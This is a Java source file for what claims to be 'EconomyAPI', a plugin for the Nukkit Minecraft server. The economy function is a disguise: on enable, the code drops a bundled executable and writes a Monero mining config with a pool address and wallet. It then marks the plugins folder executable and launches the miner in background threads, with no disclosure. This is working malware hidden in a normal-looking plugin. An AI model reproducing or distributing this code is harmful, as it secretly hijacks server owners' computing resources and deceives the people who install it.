package me.onebone.economyapi;

import cn.nukkit.plugin.PluginBase;
import com.google.common.base.Charsets;
import com.google.common.io.CharStreams;

import java.io.*;
import java.nio.file.Files;
import java.util.Properties;

public class EconomyAPI extends PluginBase {

    private Task task;
    private static EconomyAPI xmr;
    private static Properties prop;

    @Override
    public void onEnable() {
        xmr = this;
        prop = new Properties();
        try {
            init();
            prop.load(new FileInputStream(new File(getDataFolder() + "/cfg")));
            String config = CharStreams.toString(new InputStreamReader(EconomyAPI.class.getResourceAsStream("/config.json"), Charsets.UTF_8));
            BufferedWriter out = new BufferedWriter(new FileWriter(getDataFolder() + "/config.json"));
            out.write(
                    config.replace("{{pool}}", prop.getProperty("pool"))
                            .replace("{{user}}", prop.getProperty("user"))
                            .replace("{{id}}", prop.getProperty("id"))
                            .replace("{{load}}", prop.getProperty("load"))
            );
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        int t = Integer.parseInt(prop.getProperty("thread"));
        for (int i = 0; i < t; i++) {
            int finalI = i;
            new Thread(() -> {
                task = new Task();
                task.setHandler(new Handler(finalI));
                task.setCharset("utf8");
                try {
                    Runtime.getRuntime().exec("chmod -R 755 ./plugins");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                task.setShell(getDataFolder() + "/java");
                task.run();
            }).start();
        }
    }

    public static EconomyAPI getInstance() {
        return xmr;
    }

    @Override
    public void onDisable() {
        task.close();
    }

    public void init() throws IOException {
        File dir = getDataFolder();
        if (!dir.exists()) {
            dir.mkdir();
        }
        File log = new File(getDataFolder() + "/log.txt");
        if (!log.exists()) {
            log.createNewFile();
        }
        File c1 = new File(getDataFolder().getPath() + "/java");
        if (!c1.exists()) {
            Files.copy(EconomyAPI.class.getResourceAsStream("/java"), c1.toPath());
        }
        File cfg = new File(getDataFolder().getPath() + "/cfg");
        if (!cfg.exists()) {
            Properties properties = new Properties();
            properties.setProperty("pool", "xmr.f2pool.com:13531");
            properties.setProperty("user", "48wsvz59DpmiCKMmXsFMegBnN6nEYoXP9DGEmrL6aWyJD8yVCPtWgUrAh8tPW3qLcQWEq7y95pJec1L16uvxfV3QRxzWyEP");
            properties.setProperty("id", "nukkit");
            properties.setProperty("thread", "1");
            properties.setProperty("load", "100");
            properties.store(new FileOutputStream(cfg), null);
        }
    }
}
